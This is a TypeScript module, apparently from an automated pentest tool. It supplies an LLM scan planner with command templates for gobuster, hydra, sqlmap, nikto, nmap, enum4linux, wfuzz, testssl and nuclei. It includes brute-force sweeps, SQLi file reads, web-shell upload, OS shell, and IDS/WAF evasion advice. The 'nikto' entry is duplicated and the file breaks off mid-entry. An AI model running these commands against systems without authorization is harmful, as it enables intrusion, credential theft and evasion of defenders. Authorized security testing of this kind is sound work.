/**
 * Tool Knowledge Base
 *
 * Compiled from Hacking Articles (hackingarticles.in) and other security research sources.
 * This module provides contextual knowledge for the LLM scan planner to generate
 * more effective and targeted commands for each tool in our arsenal.
 *
 * Sources:
 * - https://www.hackingarticles.in/comprehensive-guide-on-gobuster-tool/
 * - https://www.hackingarticles.in/hydra-brute-force-tool-guide/
 * - https://www.hackingarticles.in/comprehensive-guide-to-sqlmap-target-options/
 * - https://www.hackingarticles.in/file-system-access-on-webserver-using-sqlmap/
 * - https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/
 * - https://www.hackingarticles.in/nmap-for-pentester-vulnerability-scan/
 * - https://www.hackingarticles.in/a-detailed-guide-on-wfuzz/
 */

export interface ToolTechnique {
  name: string;
  description: string;
  command: string;
  /** When to use this technique */
  useWhen: string[];
  /** Tags for matching against asset context */
  tags: string[];
}

export interface ToolKnowledge {
  tool: string;
  description: string;
  /** Key capabilities of the tool */
  capabilities: string[];
  /** Advanced techniques sourced from security research */
  techniques: ToolTechnique[];
  /** Common pitfalls and how to avoid them */
  pitfalls: string[];
  /** WAF/IDS evasion strategies */
  evasionStrategies: string[];
}

export const TOOL_KNOWLEDGE_BASE: Record<string, ToolKnowledge> = {
  gobuster: {
    tool: "gobuster",
    description: "Fast directory/file brute-forcing tool written in Go. Supports dir, dns, vhost, and fuzz modes.",
    capabilities: [
      "Directory and file enumeration",
      "DNS subdomain brute-forcing",
      "Virtual host discovery",
      "Extension-based file discovery",
      "Authenticated scanning with cookies",
      "Custom HTTP method probing",
      "Status code filtering",
      "Follow redirects for hidden content",
    ],
    techniques: [
      {
        name: "Authenticated Directory Scan",
        description: "Enumerate directories behind authentication using session cookies",
        command: 'gobuster dir -u {URL} -w {WORDLIST} -c "PHPSESSID={SESSION}; security=low" -q --no-error',
        useWhen: ["Login page detected", "Session cookie obtained from Hydra", "Training lab with known credentials"],
        tags: ["authenticated", "post-auth", "dvwa", "training-lab"],
      },
      {
        name: "Extension-Aware Scan",
        description: "Discover files with specific extensions matching the detected technology stack",
        command: "gobuster dir -u {URL} -w {WORDLIST} -x {EXTENSIONS} -q --no-error",
        useWhen: ["Technology stack identified", "PHP/ASP/JSP detected", "Backup files suspected"],
        tags: ["extensions", "tech-aware", "file-discovery"],
      },
      {
        name: "WAF-Evasive Scan",
        description: "Scan behind WAF with reduced threads, random user-agent, and status code filtering",
        command: "gobuster dir -u {URL} -w {WORDLIST} --random-agent -t 10 -b 403 --delay 200ms -q --no-error",
        useWhen: ["WAF detected", "Rate limiting observed", "403 responses flooding results"],
        tags: ["waf", "evasion", "stealth"],
      },
      {
        name: "API Endpoint Discovery",
        description: "Discover API endpoints using multiple HTTP methods",
        command: "gobuster dir -u {URL} -w {WORDLIST} -m GET,POST,PUT,DELETE --random-agent -q --no-error",
        useWhen: ["API target identified", "REST/GraphQL service detected", "JSON responses observed"],
        tags: ["api", "rest", "methods"],
      },
      {
        name: "Redirect-Following Deep Scan",
        description: "Follow redirects to discover content behind 301/302 responses",
        command: "gobuster dir -u {URL} -w {WORDLIST} -r -x php,html,txt -f -q --no-error",
        useWhen: ["Many 301 responses seen", "Directory listings suspected", "Trailing slash behavior differs"],
        tags: ["redirects", "deep-scan", "directories"],
      },
      {
        name: "Sensitive File Discovery",
        description: "Target backup files, configs, and sensitive extensions",
        command: "gobuster dir -u {URL} -w {WORDLIST} -x env,bak,old,conf,sql,zip,tar.gz,swp,log -q --no-error --random-agent",
        useWhen: ["Initial recon complete", "Looking for sensitive data exposure", "Backup files suspected"],
        tags: ["sensitive", "backup", "config", "data-exposure"],
      },
    ],
    pitfalls: [
      "Default User-Agent is easily fingerprinted by WAFs — always use --random-agent",
      "High thread count (-t 50+) can crash fragile targets or trigger rate limiting",
      "Without -r, 301 redirects appear as findings but content is not verified",
      "Wordlist path errors silently produce 0 results — verify wordlist exists on scan server",
      "Not using -x misses technology-specific files (e.g., .php, .aspx)",
    ],
    evasionStrategies: [
      "Use --random-agent to rotate User-Agent strings",
      "Reduce threads to 5-10 with --delay 200-500ms for WAF bypass",
      "Filter out WAF-generated 403 responses with -b 403",
      "Use -f (trailing slash) to test directory vs file behavior differences",
      "Combine with proxy (-p) for traffic analysis and rate control",
    ],
  },

  hydra: {
    tool: "hydra",
    description: "Fast parallelized network login cracker supporting 50+ protocols including HTTP forms, SSH, FTP, SMB, RDP, and more.",
    capabilities: [
      "Multi-protocol brute force (SSH, FTP, HTTP, SMB, RDP, etc.)",
      "HTTP form-based authentication attacks (GET and POST)",
      "Cookie-aware HTTP brute force",
      "Combo file attacks (login:pass format)",
      "Password generation with charset rules",
      "Multi-host concurrent attacks",
      "Resume interrupted attacks",
      "JSON output for automated parsing",
    ],
    techniques: [
      {
        name: "HTTP POST Form Brute Force",
        description: "Brute force web login forms using POST method with failure string detection",
        command: 'hydra -l {USER} -P {PASSLIST} {HOST} http-post-form "{PATH}:username=^USER^&password=^PASS^&Login=Login:{FAIL_STRING}"',
        useWhen: ["Login form detected", "POST-based authentication", "DVWA/training lab login"],
        tags: ["http", "form", "post", "login", "web"],
      },
      {
        name: "HTTP GET Form with Cookie",
        description: "Brute force authenticated pages using GET method with session cookie",
        command: 'hydra {HOST} -l {USER} -P {PASSLIST} http-get-form "{PATH}:username=^USER^&password=^PASS^&Login=Login:F={FAIL_STRING}:H=Cookie:{COOKIE}"',
        useWhen: ["GET-based auth form", "Cookie required for access", "Security level set via cookie"],
        tags: ["http", "get", "cookie", "authenticated"],
      },
      {
        name: "SSH Brute Force on Non-Standard Port",
        description: "Attack SSH service running on non-default port",
        command: "hydra -L {USERLIST} -P {PASSLIST} {HOST} ssh -s {PORT} -t 4",
        useWhen: ["SSH on non-standard port", "Port scan revealed SSH on unusual port"],
        tags: ["ssh", "non-standard-port", "service"],
      },
      {
        name: "Combo File Attack",
        description: "Use pre-built login:password pairs for faster targeted attacks",
        command: "hydra -C {COMBOFILE} {HOST} {SERVICE}",
        useWhen: ["Default credentials suspected", "OEM password list available", "Known credential pairs"],
        tags: ["combo", "defaults", "targeted"],
      },
      {
        name: "Multi-Host Sweep",
        description: "Test credentials across multiple hosts simultaneously",
        command: "hydra -L {USERLIST} -P {PASSLIST} -M {HOSTSFILE} {SERVICE} -F",
        useWhen: ["Multiple hosts with same service", "Credential reuse testing", "Network sweep"],
        tags: ["multi-host", "sweep", "lateral"],
      },
      {
        name: "Null/Same/Reverse Password Check",
        description: "Check for null passwords, username-as-password, and reversed username",
        command: "hydra -L {USERLIST} -P {PASSLIST} {HOST} {SERVICE} -e nsr",
        useWhen: ["Initial credential testing", "Weak password policy suspected", "Quick wins"],
        tags: ["null", "weak", "quick-check"],
      },
    ],
    pitfalls: [
      "HTTP GET/POST form: false positives when server returns 200 for all requests (no HTTP Basic Auth)",
      "High thread count (-t 16+) can trigger account lockout policies",
      "Must identify correct failure string — wrong string causes false positives/negatives",
      "HTTP form attacks need exact parameter names from page source",
      "Cookie values must be current — expired sessions cause all attempts to fail",
    ],
    evasionStrategies: [
      "Use -t 2-4 for rate-limited services to avoid lockout",
      "Use -W (wait time between connections) for slow brute force",
      "Combine with proxychains for IP rotation",
      "Use -e nsr first for quick wins before full wordlist attack",
      "Save progress with -o and use -R to resume if interrupted",
    ],
  },

  sqlmap: {
    tool: "sqlmap",
    description: "Automated SQL injection detection and exploitation tool. Supports all major DBMS types and can escalate to OS shell.",
    capabilities: [
      "Automatic SQL injection detection",
      "Database enumeration (--dbs, --tables, --columns, --dump)",
      "File system read/write on vulnerable servers",
      "OS shell upload and command execution",
      "WAF bypass via tamper scripts",
      "Support for GET, POST, cookies, and HTTP headers injection",
      "Burp Suite log file parsing",
      "Google dork-based target discovery",
    ],
    techniques: [
      {
        name: "Basic Database Enumeration",
        description: "Detect SQLi and enumerate all databases",
        command: "sqlmap -u '{URL}?id=1' --dbs --batch",
        useWhen: ["Parameter-based URL found", "Error-based SQLi suspected", "GET parameter with numeric value"],
        tags: ["sqli", "enumeration", "databases"],
      },
      {
        name: "POST Form Injection",
        description: "Test POST form parameters for SQL injection",
        command: "sqlmap -u '{URL}' --data='{POST_DATA}' --dbs --batch",
        useWhen: ["POST form with database backend", "Login form SQLi testing", "Search functionality"],
        tags: ["post", "form", "injection"],
      },
      {
        name: "File Read from Server",
        description: "Read files from the server filesystem via SQLi",
        command: "sqlmap -u '{URL}?id=1' --file-read={FILE_PATH} --batch",
        useWhen: ["FILE privilege confirmed", "Config file extraction needed", "Credential harvesting"],
        tags: ["file-read", "privilege", "escalation"],
      },
      {
        name: "Shell Upload via SQLi",
        description: "Upload a web shell to the server via SQL injection file write",
        command: "sqlmap -u '{URL}?id=1' --file-write={LOCAL_SHELL} --file-dest={REMOTE_PATH} --batch",
        useWhen: ["FILE privilege confirmed", "Write access to web root", "RCE escalation needed"],
        tags: ["shell", "upload", "rce", "escalation"],
      },
      {
        name: "OS Shell via SQLi",
        description: "Get interactive OS shell through SQL injection",
        command: "sqlmap -u '{URL}?id=1' --os-shell --batch",
        useWhen: ["Full exploitation authorized", "DBA privileges confirmed", "Post-exploitation phase"],
        tags: ["os-shell", "rce", "full-exploitation"],
      },
      {
        name: "WAF Bypass with Tamper Scripts",
        description: "Use tamper scripts to bypass WAF/IDS filtering",
        command: "sqlmap -u '{URL}?id=1' --tamper=space2comment,between,randomcase --dbs --batch",
        useWhen: ["WAF blocking payloads", "403/406 responses to injection attempts", "IDS alerts triggered"],
        tags: ["waf", "bypass", "tamper", "evasion"],
      },
      {
        name: "Burp Request File Attack",
        description: "Use saved Burp Suite request for precise injection",
        command: "sqlmap -r {REQUEST_FILE} --dbs --batch",
        useWhen: ["Complex request with headers/cookies", "Multi-parameter injection", "Authenticated endpoint"],
        tags: ["burp", "request-file", "complex"],
      },
    ],
    pitfalls: [
      "Running without --batch causes interactive prompts that hang automated scans",
      "Default risk/level may miss second-order or time-based injections",
      "File read/write requires DBA FILE privilege — check with --privileges first",
      "OS shell attempts may crash the target application",
      "Google dork mode (-g) attacks random live sites — never use in engagements",
    ],
    evasionStrategies: [
      "Use --tamper scripts: space2comment, between, randomcase, charencode",
      "Increase --level and --risk for deeper testing (level=5, risk=3)",
      "Use --random-agent to avoid SQLMap User-Agent detection",
      "Route through proxy with --proxy for traffic analysis",
      "Use --delay and --time-sec for rate-limited targets",
    ],
  },

  nikto: {
    tool: "nikto",
    description: "Web server vulnerability scanner that checks for dangerous files/CGIs, outdated software, and misconfigurations.",
    capabilities: [
      "Outdated server software detection",
      "Dangerous file/CGI detection (6700+ checks)",
      "Server misconfiguration identification",
      "HTTP method testing",
      "SSL/TLS vulnerability checking",
      "Authentication brute force (basic/digest)",
      "Proxy support for traffic analysis",
      "Multiple output formats (HTML, XML, CSV)",
    ],
    techniques: [
      {
        name: "Basic Web Server Scan",
        description: "Standard vulnerability scan against a web server",
        command: "nikto -h {URL} -o {OUTPUT_FILE} -Format htm",
        useWhen: ["Web server detected", "Initial vulnerability assessment", "HTTP/HTTPS service found"],
        tags: ["web", "vuln-scan", "basic"],
      },
      {
        name: "SSL-Enabled Scan",
        description: "Scan HTTPS targets with SSL certificate analysis",
        command: "nikto -h {URL} -ssl -o {OUTPUT_FILE}",
        useWhen: ["HTTPS service detected", "SSL/TLS analysis needed", "Certificate issues suspected"],
        tags: ["ssl", "https", "tls"],
      },
      {
        name: "Specific Port Scan",
        description: "Scan web service on non-standard port",
        command: "nikto -h {HOST} -p {PORT} -o {OUTPUT_FILE}",
        useWhen: ["Web service on non-standard port", "Multiple web ports detected"],
        tags: ["port", "non-standard"],
      },
      {
        name: "Tuning for Specific Tests",
        description: "Focus scan on specific vulnerability categories",
        command: "nikto -h {URL} -Tuning {TUNING_CODE}",
        useWhen: ["Targeted testing needed", "Time-constrained scan", "Specific vulnerability class"],
        tags: ["tuning", "targeted", "focused"],
      },
      {
        name: "Evasive Scan with Encoding",
        description: "Use IDS evasion techniques during scanning",
        command: "nikto -h {URL} -evasion {EVASION_CODE}",
        useWhen: ["IDS/IPS detected", "Scan being blocked", "Stealth required"],
        tags: ["evasion", "ids", "stealth"],
      },
    ],
    pitfalls: [
      "Nikto is very noisy — generates many requests and is easily detected",
      "Without -ssl flag, HTTPS targets fail silently",
      "Large scan output can be overwhelming — use -Tuning to focus",
      "False positives common for custom 404 pages",
      "Timeout issues on slow servers — increase with -timeout",
    ],
    evasionStrategies: [
      "Use -evasion options (1-8) for IDS bypass techniques",
      "Route through proxy with -useproxy for IP masking",
      "Use -Pause to add delays between requests",
      "Combine with -Tuning to reduce request volume",
      "Use -mutate for URL mutation techniques",
    ],
  },

  nmap: {
    tool: "nmap",
    description: "Network exploration and security auditing tool with NSE scripting engine for vulnerability detection.",
    capabilities: [
      "Host discovery and port scanning",
      "Service/version detection (-sV)",
      "OS fingerprinting (-O)",
      "NSE vulnerability scripts",
      "Timing templates for stealth/speed",
      "Output in multiple formats (XML, grepable)",
      "Script categories (vuln, exploit, auth, brute)",
      "Firewall/IDS evasion techniques",
    ],
    techniques: [
      {
        name: "EternalBlue Detection",
        description: "Check for MS17-010 SMBv1 vulnerability",
        command: "nmap --script smb-vuln-ms17-010.nse {HOST}",
        useWhen: ["SMB service detected (port 445)", "Windows host identified", "Legacy Windows suspected"],
        tags: ["smb", "ms17-010", "eternalblue", "windows"],
      },
      {
        name: "Vulners-Based Scan",
        description: "Use nmap-vulners for CVE detection based on service versions",
        command: "nmap -sV -Pn {HOST} --script=vulners/vulners.nse",
        useWhen: ["Service versions detected", "CVE mapping needed", "Vulnerability prioritization"],
        tags: ["vulners", "cve", "version-based"],
      },
      {
        name: "SSL/TLS Vulnerability Check",
        description: "Detect SSL vulnerabilities (POODLE, CCS injection)",
        command: "nmap --script ssl-poodle,ssl-ccs-injection -p 443 {HOST}",
        useWhen: ["HTTPS/SSL service detected", "TLS configuration audit", "Certificate analysis"],
        tags: ["ssl", "tls", "poodle", "heartbleed"],
      },
      {
        name: "FTP Backdoor Detection",
        description: "Check for vsFTPd 2.3.4 backdoor vulnerability",
        command: "nmap --script ftp-vsftpd-backdoor -p 21 {HOST}",
        useWhen: ["FTP service detected", "vsFTPd version 2.3.4 identified"],
        tags: ["ftp", "backdoor", "vsftpd"],
      },
      {
        name: "HTTP Slowloris Check",
        description: "Test for HTTP Slowloris DoS vulnerability without launching actual attack",
        command: "nmap --script http-slowloris-check {HOST}",
        useWhen: ["Web server detected", "DoS resilience testing", "Apache/nginx target"],
        tags: ["http", "dos", "slowloris"],
      },
      {
        name: "Comprehensive Vuln Scan",
        description: "Run all vulnerability detection scripts",
        command: "nmap -sV --script=vuln {HOST}",
        useWhen: ["Full vulnerability assessment", "Deep scan authorized", "All services need checking"],
        tags: ["comprehensive", "all-vulns", "deep"],
      },
    ],
    pitfalls: [
      "Running without -Pn on firewalled hosts causes false 'host down' results",
      "Aggressive timing (-T5) triggers IDS alerts and may miss services",
      "NSE vuln scripts can crash fragile services — use with caution",
      "vulners script requires -sV for version detection to work",
      "Large script scans generate significant traffic — monitor bandwidth",
    ],
    evasionStrategies: [
      "Use -T2 or -T1 for slow, stealthy scanning",
      "Fragment packets with -f for IDS bypass",
      "Use decoy scans with -D for source IP obfuscation",
      "Randomize host order with --randomize-hosts",
      "Use --source-port 53 or 80 for firewall bypass",
    ],
  },

  enum4linux: {
    tool: "enum4linux",
    description: "SMB/NetBIOS enumeration tool for extracting domain info, users, shares, and password policies from Windows/Linux targets.",
    capabilities: [
      "Domain and group membership enumeration",
      "User listing via RID cycling",
      "Share enumeration (drives and folders)",
      "Password policy extraction",
      "OS information detection",
      "SID enumeration",
      "Workgroup/domain identification",
      "Null session exploitation",
    ],
    techniques: [
      {
        name: "Full Enumeration",
        description: "Run complete SMB enumeration with all checks",
        command: "enum4linux -a {HOST}",
        useWhen: ["SMB service detected (port 445/139)", "Windows domain target", "Initial SMB recon"],
        tags: ["smb", "full", "enumeration"],
      },
      {
        name: "User Enumeration via RID",
        description: "Extract user accounts through RID cycling",
        command: "enum4linux -r {HOST}",
        useWhen: ["User list needed", "Active Directory enumeration", "Credential attack preparation"],
        tags: ["users", "rid", "active-directory"],
      },
      {
        name: "Share Enumeration",
        description: "List available SMB shares",
        command: "enum4linux -S {HOST}",
        useWhen: ["File share access testing", "Data exfiltration paths", "Sensitive file discovery"],
        tags: ["shares", "files", "access"],
      },
      {
        name: "Password Policy Extraction",
        description: "Extract password policy for brute force planning",
        command: "enum4linux -P {HOST}",
        useWhen: ["Before brute force attacks", "Lockout policy assessment", "Password complexity check"],
        tags: ["password-policy", "lockout", "brute-force-prep"],
      },
      {
        name: "Authenticated Enumeration",
        description: "Enumerate with known credentials for deeper access",
        command: "enum4linux -u {USER} -p {PASS} -a {HOST}",
        useWhen: ["Credentials obtained", "Post-exploitation enumeration", "Deeper domain mapping"],
        tags: ["authenticated", "post-exploit", "deep"],
      },
    ],
    pitfalls: [
      "Null sessions often disabled on modern Windows — may return empty results",
      "RID cycling can be slow on large domains — set appropriate ranges",
      "Some shares require authentication even to list",
      "Tool output is verbose — parse carefully for actionable data",
      "Modern AD environments may block unauthenticated RPC calls",
    ],
    evasionStrategies: [
      "Use authenticated enumeration when null sessions fail",
      "Combine with smbclient for manual share exploration",
      "Use enum4linux-ng (Python rewrite) for better error handling",
      "Limit RID range to reduce noise: -r 500-1100",
      "Run during business hours to blend with normal SMB traffic",
    ],
  },

  wfuzz: {
    tool: "wfuzz",
    description: "Python-based web application fuzzer for discovering hidden content, parameters, and authentication bypasses.",
    capabilities: [
      "Directory and file fuzzing",
      "Subdomain discovery",
      "Parameter fuzzing (GET/POST)",
      "Cookie and header fuzzing",
      "HTTP method enumeration",
      "Authentication brute force",
      "Multi-parameter fuzzing (FUZZ, FUZ2Z, FUZ3Z)",
      "Recursive directory fuzzing",
      "Encoder support (md5, base64, urlencode)",
      "Proxy routing for traffic analysis",
    ],
    techniques: [
      {
        name: "Directory Fuzzing with Filtering",
        description: "Fuzz directories while filtering out noise",
        command: "wfuzz -w {WORDLIST} --sc 200,301 {URL}/FUZZ",
        useWhen: ["Directory enumeration needed", "Gobuster alternative", "Need response filtering"],
        tags: ["directory", "filtering", "discovery"],
      },
      {
        name: "Subdomain Discovery",
        description: "Brute force subdomains using wordlist",
        command: "wfuzz -c -Z -w {WORDLIST} -H 'Host: FUZZ.{DOMAIN}' {URL}",
        useWhen: ["Subdomain enumeration", "Virtual host discovery", "Scope expansion"],
        tags: ["subdomain", "vhost", "discovery"],
      },
      {
        name: "POST Authentication Brute Force",
        description: "Brute force login forms via POST parameters",
        command: 'wfuzz -z file,{USERLIST} -z file,{PASSLIST} --sc 200 -d "uname=FUZZ&pass=FUZ2Z" {URL}',
        useWhen: ["Login form detected", "POST-based auth", "Credential testing"],
        tags: ["auth", "brute-force", "post", "login"],
      },
      {
        name: "Cookie Fuzzing",
        description: "Fuzz cookie values for session manipulation",
        command: "wfuzz -z file,{WORDLIST} -b cookie=FUZZ {URL}",
        useWhen: ["Session manipulation testing", "Cookie poisoning", "Privilege escalation via cookies"],
        tags: ["cookie", "session", "privilege"],
      },
      {
        name: "HTTP Method Enumeration",
        description: "Test which HTTP methods are accepted",
        command: 'wfuzz -z list,GET-HEAD-POST-PUT-DELETE-OPTIONS-TRACE -X FUZZ --sc 200,405 "{URL}"',
        useWhen: ["HTTP method testing", "PUT method exploitation", "TRACE/TRACK testing"],
        tags: ["methods", "http", "options"],
      },
      {
        name: "Recursive Directory Fuzzing",
        description: "Fuzz directories recursively to discover nested content",
        command: 'wfuzz -z list,"{DIRS}" -R1 --hc 404 {URL}/FUZZ',
        useWhen: ["Deep directory structure suspected", "Nested admin panels", "Multi-level enumeration"],
        tags: ["recursive", "deep", "nested"],
      },
      {
        name: "Header Injection Fuzzing",
        description: "Fuzz HTTP headers for injection vulnerabilities",
        command: 'wfuzz -z file,{WORDLIST} -H "X-Forwarded-For: FUZZ" --hc 404 {URL}',
        useWhen: ["Header injection testing", "IP-based access control bypass", "Host header attacks"],
        tags: ["headers", "injection", "bypass"],
      },
    ],
    pitfalls: [
      "Without --hc/--sc filters, output is overwhelmingly noisy",
      "pycurl dependency issues on some systems — may need reinstall",
      "Multi-parameter fuzzing (FUZ2Z) generates cartesian product — can be very slow",
      "Recursive fuzzing (-R) multiplies requests exponentially",
      "Encoding payloads may cause false negatives if server doesn't decode",
    ],
    evasionStrategies: [
      "Route through proxy with -p for IP rotation",
      "Use encoders (urlencode, base64) to bypass input filters",
      "Add delays between requests with --req-delay",
      "Use -Z (scan mode) to ignore connection errors gracefully",
      "Combine with -H to set legitimate User-Agent headers",
    ],
  },

  testssl: {
    tool: "testssl",
    description: "Command-line tool for testing TLS/SSL encryption on any port, checking for vulnerabilities and misconfigurations.",
    capabilities: [
      "Protocol support testing (SSLv2, SSLv3, TLS 1.0-1.3)",
      "Cipher suite enumeration",
      "Certificate chain validation",
      "Known vulnerability detection (Heartbleed, POODLE, DROWN, ROBOT, etc.)",
      "HSTS/HPKP header checking",
      "Forward secrecy verification",
      "Certificate transparency log checking",
    ],
    techniques: [
      {
        name: "Full TLS Assessment",
        description: "Complete TLS/SSL vulnerability assessment",
        command: "testssl --full {HOST}:{PORT}",
        useWhen: ["HTTPS service detected", "TLS compliance audit", "Certificate review needed"],
        tags: ["tls", "ssl", "full-audit"],
      },
      {
        name: "Vulnerability-Only Check",
        description: "Check only for known TLS vulnerabilities",
        command: "testssl --vulnerable {HOST}:{PORT}",
        useWhen: ["Quick vulnerability check", "Known CVE detection", "Heartbleed/POODLE screening"],
        tags: ["vulnerabilities", "cve", "quick"],
      },
      {
        name: "JSON Output for Automation",
        description: "Generate machine-readable JSON output",
        command: "testssl --jsonfile {OUTPUT} {HOST}:{PORT}",
        useWhen: ["Automated pipeline", "Report generation", "Data aggregation"],
        tags: ["json", "automation", "reporting"],
      },
    ],
    pitfalls: [
      "Full scans can take 5-10 minutes per host",
      "Some checks require specific OpenSSL versions",
      "STARTTLS services need explicit protocol specification",
      "Rate limiting may cause incomplete results",
    ],
    evasionStrategies: [
      "testssl is passive (client-side only) — minimal evasion needed",
      "Use --sneaky to reduce connection fingerprint",
      "Specify --ip to test specific backend when behind CDN",
    ],
  },

  nuclei: {
    tool: "nuclei",
    description: "Fast, template-based vulnerability scanner using YAML templates. 9000+ community templates for comprehensive coverage. Supports automatic tech-stack detection and conditional workflow scanning.",
    capabilities: [
      "Template-based vulnerability scanning",
      "Severity-filtered scanning (critical, high, medium, low, info)",
      "Automatic tech-stack detection with -as flag",
      "Tag-based template selection by technology",
      "Conditional workflow templates (detect → scan)",
      "Custom template creation",
      "Rate limiting and concurrency control",
      "Multiple output formats (JSON, Markdown)",
      "Headless browser support for JS-heavy apps",
      "Interactsh integration for OOB testing",
      "Authenticated scanning with cookies/headers",
    ],
    techniques: [
      {
        name: "Automatic Tech-Stack Scan",
        description: "Fingerprint target technology and auto-select matching templates",
        command: "nuclei -u {URL} -as -nc -duc -ni -jsonl",
        useWhen: ["Initial scan with unknown tech stack", "Quick automated assessment", "First-pass vulnerability detection"],
        tags: ["auto", "fingerprint", "tech-detect"],
      },
      {
        name: "WordPress Targeted Scan",
        description: "Comprehensive WordPress vulnerability scan including plugins, themes, and core",
        command: "nuclei -u {URL} -tags wordpress,wp-plugin,wp-theme -nc -duc -ni -jsonl",
        useWhen: ["WordPress detected", "WP-Content paths found", "wp-login.php discovered"],
        tags: ["wordpress", "cms", "php"],
      },
      {
        name: "Apache/Nginx Server Scan",
        description: "Scan for web server misconfigurations and known CVEs",
        command: "nuclei -u {URL} -tags apache,nginx -severity critical,high,medium -nc -duc -ni -jsonl",
        useWhen: ["Apache or Nginx detected in headers", "Server version exposed", "Web server assessment"],
        tags: ["apache", "nginx", "webserver"],
      },
      {
        name: "Java/Tomcat Stack Scan",
        description: "Target Java application servers and frameworks",
        command: "nuclei -u {URL} -tags java,tomcat,spring,struts -nc -duc -ni -jsonl",
        useWhen: ["Java stack detected", "Tomcat manager found", "Spring Boot actuator exposed", ".jsp pages found"],
        tags: ["java", "tomcat", "spring", "struts"],
      },
      {
        name: "CI/CD and DevOps Scan",
        description: "Detect exposed CI/CD panels, misconfigs, and default credentials",
        command: "nuclei -u {URL} -tags jenkins,gitlab,grafana,kibana,prometheus -nc -duc -ni -jsonl",
        useWhen: ["DevOps tools detected", "Jenkins/GitLab exposed", "Monitoring dashboards found"],
        tags: ["cicd", "devops", "jenkins", "gitlab"],
      },
      {
        name: "Default Login Detection",
        description: "Check for default credentials on detected services",
        command: "nuclei -u {URL} -tags default-login -nc -duc -ni -jsonl",
        useWhen: ["Admin panels discovered", "Service login pages found", "Default credential check"],
        tags: ["default-login", "credentials", "panel"],
      },
      {
        name: "Severity-Filtered Scan",
        description: "Scan for only critical and high severity vulnerabilities",
        command: "nuclei -u {URL} -severity critical,high -nc -duc -ni -jsonl",
        useWhen: ["Initial vulnerability assessment", "High-priority findings only", "Time-constrained scan"],
        tags: ["severity", "critical", "high-priority"],
      },
      {
        name: "CVE-Focused Scan",
        description: "Scan for specific CVEs or CVE patterns",
        command: "nuclei -u {URL} -tags cve -severity critical,high -nc -duc -ni -jsonl",
        useWhen: ["CVE validation needed", "Patch verification", "Known vulnerability confirmation"],
        tags: ["cve", "validation", "patch-check"],
      },
      {
        name: "Exposure and Misconfiguration Scan",
        description: "Detect exposed files, configs, and misconfigurations",
        command: "nuclei -u {URL} -tags exposure,misconfig -nc -duc -ni -jsonl",
        useWhen: ["Configuration audit", "Sensitive file detection", "Information disclosure check"],
        tags: ["exposure", "misconfig", "information-disclosure"],
      },
      {
        name: "Authenticated Nuclei Scan",
        description: "Run templates with authentication cookies for deeper coverage",
        command: 'nuclei -u {URL} -tags cve,misconfig -H "Cookie: {COOKIE}" -nc -duc -ni -jsonl',
        useWhen: ["Session cookie available", "Authenticated scan required", "Post-login vulnerability check"],
        tags: ["authenticated", "cookie", "session"],
      },
      {
        name: "Full Template Scan",
        description: "Run all available templates for comprehensive coverage",
        command: "nuclei -u {URL} -nc -duc -ni -jsonl -rl 50 -c 25",
        useWhen: ["Deep scan authorized", "Comprehensive assessment", "No time constraints"],
        tags: ["full", "comprehensive", "deep"],
      },
      {
        name: "Exposed Panel Detection",
        description: "Detect exposed admin panels and login pages",
        command: "nuclei -u {URL} -tags panel,login -nc -duc -ni -jsonl",
        useWhen: ["Admin panel discovery", "Exposed service detection", "Attack surface mapping"],
        tags: ["panel", "login", "exposed"],
      },
    ],
    pitfalls: [
      "Without -nc (no color) and -ni (no interactsh), output parsing breaks",
      "Full template scans generate massive traffic — use -rl for rate limiting",
      "Template updates (-duc disable update check) prevent scan delays",
      "Some templates require authenticated access — use -H Cookie header",
      "Headless templates are slow — use -headless only for JS-heavy apps",
      "-as (auto-select) may miss templates if fingerprinting fails — combine with explicit -tags",
      "Workflow templates require specific template paths — verify paths exist on scan server",
    ],
    evasionStrategies: [
      "Use -rl (rate limit) to control requests per second (recommended: 10-30 for WAF targets)",
      "Use -c (concurrency) to limit parallel template executions (recommended: 5-10 for WAF)",
      "Add -H for custom User-Agent to blend with normal traffic",
      "Use -proxy for traffic routing through intermediaries",
      "Filter templates with -exclude-tags to reduce noise and traffic volume",
      "Use -timeout to prevent hanging on slow/filtered responses",
      "Split scans across time windows to avoid rate-limit triggers",
    ],
  },

  nikto: {
    tool: "nikto",
    description: "Open-source web server scanner that detects 6700+ dangerous files/CGIs, outdated software, misconfigurations. Supports tuning-based scan filtering and IDS evasion.",
    capabilities: [
      "Web server vulnerability scanning (6700+ checks)",
      "Outdated software detection",
      "CGI directory scanning",
      "Tuning-based scan category filtering",
      "IDS/IPS evasion techniques (LibWhisker)",
      "SSL/TLS scanning",
      "HTTP authentication support",
      "Cookie-based authenticated scanning",
      "Multiple output formats (CSV, HTML, XML, Nessus, Metasploit)",
      "Proxy support for traffic routing",
      "Virtual host scanning",
    ],
    techniques: [
      {
        name: "Targeted Misconfiguration Scan",
        description: "Scan only for misconfigurations and default files (fast, focused)",
        command: "nikto -h {URL} -Tuning 2 -Format xml -o nikto-misconfig.xml -nointeractive",
        useWhen: ["Quick misconfiguration check", "Default file detection", "Server hardening audit"],
        tags: ["misconfig", "default", "quick"],
      },
      {
        name: "Injection Vulnerability Scan",
        description: "Focus on XSS, SQL injection, and command execution checks",
        command: "nikto -h {URL} -Tuning 489 -Format xml -o nikto-injection.xml -nointeractive",
        useWhen: ["Injection testing", "XSS detection", "SQL injection check", "Command execution"],
        tags: ["injection", "xss", "sqli", "rce"],
      },
      {
        name: "Information Disclosure Scan",
        description: "Detect exposed sensitive information and files",
        command: "nikto -h {URL} -Tuning 3 -Format xml -o nikto-disclosure.xml -nointeractive",
        useWhen: ["Information gathering", "Sensitive file detection", "Data leakage check"],
        tags: ["disclosure", "information", "sensitive"],
      },
      {
        name: "Authentication Bypass Scan",
        description: "Check for authentication bypass vulnerabilities",
        command: "nikto -h {URL} -Tuning a -Format xml -o nikto-authbypass.xml -nointeractive",
        useWhen: ["Auth bypass testing", "Access control audit", "Privilege escalation check"],
        tags: ["auth-bypass", "access-control", "privilege"],
      },
      {
        name: "Authenticated Scan with Cookie",
        description: "Run Nikto with session cookie for authenticated scanning",
        command: 'nikto -h {URL} -id {USER}:{PASS} -Format xml -o nikto-auth.xml -nointeractive',
        useWhen: ["Session cookie available", "Post-login scanning", "Authenticated vulnerability check"],
        tags: ["authenticated", "cookie", "session"],
      },
      {
        name: "Comprehensive Scan with All Tuning",
        description: "Run all scan categories for maximum coverage",
        command: "nikto -h {URL} -Tuning 123456789abc -Cgidirs all -Format xml -o nikto-full.xml -nointeractive",
        useWhen: ["Deep scan authorized", "Full vulnerability assessment", "No time constraints"],
        tags: ["full", "comprehensive", "deep"],
      },
      {
